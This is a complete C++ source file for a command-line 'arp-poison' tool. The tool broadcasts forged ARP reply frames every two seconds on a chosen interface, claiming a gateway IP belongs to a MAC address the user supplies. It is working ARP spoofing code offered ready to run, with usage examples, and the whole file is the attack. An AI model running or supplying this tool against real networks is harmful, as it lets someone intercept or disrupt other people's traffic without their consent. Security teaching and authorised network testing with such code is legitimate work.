#include <iostream>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <csignal>

#define IP4LEN 4
#define PKTLEN sizeof(struct ether_header) + sizeof(struct ether_arp)

int sock;

// Function to display usage
void usage() {
    std::cerr << "usage:\t./arp-poison <interface> <gateway ip> <mac addr>" << std::endl;
    std::cerr << "ex:\t./arp-poison eth0 10.1.1.1 aa:bb:cc:dd:ee:ff" << std::endl;
    exit(EXIT_FAILURE);
}

// Function to clean up resources on program exit
void cleanup(int sig) {
    close(sock);
    exit(EXIT_SUCCESS);
}

int main(int argc, char** argv) {
    char packet[PKTLEN];
    struct ether_header* eth = (struct ether_header*) packet;
    struct ether_arp* arp = (struct ether_arp*) (packet + sizeof(struct ether_header));
    struct sockaddr_ll device;

    if (argc < 4) {
        usage();
    }

    // Create a raw socket for sending ARP packets
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Ensure socket is closed when Ctrl+C is pressed
    std::signal(SIGINT, cleanup);

    // Parse the MAC address from argv[3]
    unsigned int mac[6];
    if (sscanf(argv[3], "%x:%x:%x:%x:%x:%x", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) != 6) {
        std::cerr << "Invalid MAC address format." << std::endl;
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < 6; ++i) {
        arp->arp_sha[i] = static_cast<uint8_t>(mac[i]);
    }

    // Parse the IP address from argv[2]
    unsigned int ip[4];
    if (sscanf(argv[2], "%d.%d.%d.%d", &ip[0], &ip[1], &ip[2], &ip[3]) != 4) {
        std::cerr << "Invalid IP address format." << std::endl;
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < 4; ++i) {
        arp->arp_spa[i] = static_cast<uint8_t>(ip[i]);
    }

    // Broadcast MAC address
    std::memset(eth->ether_dhost, 0xff, ETH_ALEN); // Broadcast
    std::memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);
    eth->ether_type = htons(ETH_P_ARP);

    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp->ea_hdr.ar_hln = ETH_ALEN;
    arp->ea_hdr.ar_pln = IP4LEN;
    arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
    std::memset(arp->arp_tha, 0xff, ETH_ALEN);
    std::memset(arp->arp_tpa, 0x00, IP4LEN);

    // Initialize the device structure
    std::memset(&device, 0, sizeof(device));
    device.sll_ifindex = if_nametoindex(argv[1]);
    if (device.sll_ifindex == 0) {
        std::cerr << "Invalid network interface." << std::endl;
        exit(EXIT_FAILURE);
    }
    device.sll_family = AF_PACKET;
    std::memcpy(device.sll_addr, arp->arp_sha, ETH_ALEN);
    device.sll_halen = htons(ETH_ALEN);

    std::cout << "Press Ctrl+C to exit." << std::endl;
    while (true) {
        std::cout << argv[1] << ": " << argv[2] << " is at " << argv[3] << std::endl;
        if (sendto(sock, packet, PKTLEN, 0, (struct sockaddr*)&device, sizeof(device)) < 0) {
            perror("sendto");
        }
        sleep(2);
    }

    return 0;
}
